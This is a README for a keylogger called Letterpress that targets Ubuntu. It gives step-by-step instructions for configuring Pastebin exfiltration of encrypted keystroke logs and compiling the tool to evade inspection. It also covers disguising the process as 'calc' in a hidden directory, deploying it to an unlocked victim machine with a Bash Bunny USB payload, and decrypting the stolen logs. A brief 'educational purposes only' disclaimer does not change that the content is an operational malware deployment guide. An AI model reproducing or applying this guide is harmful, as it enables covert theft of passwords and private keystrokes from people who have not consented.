# Letterpress

A nefarious keylogger for Ubuntu.

Letterpress...
- hides in plain sight
- compiles to python bytecode for obfuscation 
- encrypts keylog files so that only you can read them
- uploads keylog files to pastebin for remote exfiltration
- is easily deployable with the [Bash Bunny](https://wiki.bashbunny.com/#!index.md)

__DISCLAIMER: Letterpress is for educational purposes only. The use of this software should not be used under circumstances where doing so is illegal. The author is not responsible for its use. Don't be a dick.__

I'm hoping to make Letterpress cross-platform in the near future. If its been a couple of months since I've written this, that hasn't happened yet, and you wish to use it with another OS, bug me.

## Getting Started

```bash
# clone the repo
git clone https://github.com/brannondorsey/letterpress.git

# navigate into the cloned directory
cd letterpress

# install the necessary dependencies
# note: this may require sudo
pip install python-xlib pycrypto PyInstaller
```

## Configure

Letterpress must be configured before use. This is done by editing the [`src/config.py`](src/config.py) file.

### Using an RSA keypair

Letterpress uses an RSA public key to encrypt a symmetric AES cypher that is used to encrypt the keylog file that lives on the victim's computer. This protects the keylog file from being inspected at rest or in-transit from anyone but yourself (or whoever has the corresponding private RSA). 

If you don't have an existing RSA keypair, you can generate one with:

```bash
ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
```

In order for your public key to be used to encrypt the keylog file you must add its contents as a string to the `public_key` variable inside of [`src/config.py`](src/config.py).

```python
# edit in src/config.py
public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDh15NNqRbPkDmyhEsyua3YXtLsXaxSH+Hwezy01GZY4aJdqSmUtCihRrMWkSD5pTbQ7UCflSSZ/09gK/yRQGlAHkSesIGtS/y2cZ7dfOFBQdGq9m1nP5vRldNq7JyicuI+pwVCb7Nkap+Zt0sb6nWi1gcJzHvyDFkhlonOG1GNxdS8BVvLe/l090nZoiNwaCtFaSxnhjOzoZEKjOe0tpucS+7AeP+AT4GIKLVLfMC0Wy8xQwSBKF22yS9z5p64eDTdOZG9c1/3dyIeyEbF5klQzF5rs31if0kiISNl+xoTBwrk0iB8Df27amzjuXEKYKbNV8MBiEOciJ7oXm5ieZHb test@example.com"
```

### Adding Pastebin Credentials

[Pastebin](https://pastebin.com/) is a popular text storage site that is often used by hackers to store, publish, or share stolen and leaked information. You must create a Pastebin account to use Letterpress, however accounts with API usage limits are free. Note that depending on your use of Letterpress you may wish to create a pastebin account using an email address that is not linked to your real name/identity. 

You must provide a value for the following variables in [`src/config.py`](src/config.py) like so:

```python
pastebin_username    = 'foobar'
pastebin_password    = '1337'
pastebin_api_dev_key = 'deadbeef1337d99a74fbe169e3eba035' 
```

Your unique pastebin API key can be found by clicking the API tab on [pastebin.com](https://pastebin.com)

### Changing Log Update & Upload Intervals

To minimize suspicion, Letterpress buffers keypresses and flushes them to file at an interval instead of after every keypress. Similarly, it uploads the encrypted keylog to pastebin after each set number of keypresses. The values for both of these intervals can be configured in [`src/config.py`](src/config.py).

```python
# flush buffer to file after this many key presses
num_keypresses_between_log_updates = 100
# upload the keylog to pastebin after this man key presses
num_keypresses_between_uploads     = 5000
```

## Build

Letterpress leverages [PyInstaller](https://github.com/pyinstaller/pyinstaller) to bundle all python dependencies into a compiled executable. To compile [`src/keylogger.py`](src/keylogger.py) into a standalone that can be deployed on a victim's machine, run:

```bash
./build.sh
```

If everything worked correctly the keylogger should have been compiled to `keylogger` in the project root.

## Deploy

Now that you've configured and built Letterpress, the last step is to actually get it onto your victim's computer. Again, Letterpress is for educational purposes only. __Do not__ use this on a machine you do not own without the owner's consent.

`keylogger` saves encrypted keylogs in a `.cache` hidden folder next to the binary. Each time it is launched it creates a new keylog file and AES key arbitrarily named `.cache/XXXX` and `.cache/XXXX_aes` respectively. The AES key is encrypted with the Public RSA key. This decrypted key was used to encrypt the `XXXX` keylog. These files two files are uploaded to pastebin every `num_keypresses_between_uploads` keypresses.

`install_keylogger.sh` is a quick and easy way to install the keylogger on a victim's machine. If both files exist on a target Ubuntu machine, and sit next to one another, the following command will install and run `keylogger`, hiding it plain site as `/home/$USER/.linux-calculator/calc`.

```bash
# install and run the keylogger, renaming it to calc and redirecting output to /dev/null
KEYLOGGER=keylogger INSTALL_DIR=/home/$USER/.linux-calculator BIN_NAME=calc ./install_keylogger.sh

# make sure it is running
ps aux | grep calc
```

If you choose not to install `keylogger` with `install_keylogger.sh` it is advisable to rename `keylogger` to something less suspicious given that it will be viewable to the victim if they inspect their running processes (via `ps`, etc...). 

### Deploy Using BashBunny

I've included a `payload.txt` script so that you can easily deploy Letterpress using a [Bash Bunny](https://wiki.bashbunny.com/#!index.md).

#### Arm Your Bash Bunny

Place your Bash Bunny in arming mode by flipping the switch so that it is closest to the USB side. You should see it pop up as a USB storage device named "BashBunny". Navigate to `path/to/BashBunny/payloads/switch1`. Delete the current contents in this folder if any exist. Copy the contents of the Letterpress contents into `switch1` (if you choose to instead arm to `switch2` be sure to edit the `SWITCH` variable in `install_keylogger.sh` to reflect this).

Replace `USERNAME` with the victim's username in `/home/USERNAME/BashBunny/...` inside the `payload.txt` that you just copied.  

#### Attack

Flip the Bash Bunny switch from arming mode to switch1 and plug it in to a victim Ubuntu machine. Note: the vicitm's screen must not be locked. Once the Bash Bunny boots up it should:

1. Open a new Terminal
2. Runs `bash "/media/USER_NAME/BashBunny/payloads/switch1/install_keylogger.sh"`
3. Waits 5 seconds and then exits the terminal

The keylogger should now be installed and running on the vicitm machine and you can unplug the Bash Bunny.

## Download and Decrypt Keylogs

Once your keylogger is deployed you should see periodic uploads to your pastebin as the user types on their machine. Download the encrypted keylog files `XXXX` and their matching AES key `XXXX_aes` and save them to disk. If pastebin automatically adds a `.txt` extension remove it. You can now decrypt and view the keylog `XXXX` like so:

```
PRIVATE_KEY=path/to/private_key ./decrypt.py XXXX
```

## Todo

- Keep the `keylogger` process up and launch on startup with a cron job.
- Edit `decrypt.py` so that it can optionally download from pastebin directly. Through something like a `--download` flag.
- Make cross-platform (MacOS + Windoze).

## Credit

Most of the magick keylogging code comes from [pyxhook](https://github.com/JeffHoogland/pyxhook).